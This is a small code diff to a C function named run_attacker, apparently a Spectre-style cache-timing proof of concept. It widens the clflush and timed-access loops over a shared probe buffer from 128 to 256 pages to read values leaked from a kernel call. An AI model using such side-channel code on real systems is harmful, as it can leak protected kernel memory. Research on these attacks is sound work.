@@ -57,13 +57,13 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 	       call_kernel_part2(kernel_fd, shared_memory, 0);
        }
 
-       for (int pages = 0; pages < 128; pages++) {
+       for (int pages = 0; pages < 256; pages++) {
            clflush(shared_memory + 4096*pages);
        }
 
        call_kernel_part2(kernel_fd, shared_memory, current_offset);
 
-       for (int cache_line = 0; cache_line < 128; cache_line++) {
+       for (int cache_line = 0; cache_line < 256; cache_line++) {
 	       access_time = time_access(shared_memory + 4096*cache_line);
                if (access_time < 150) {
 		       
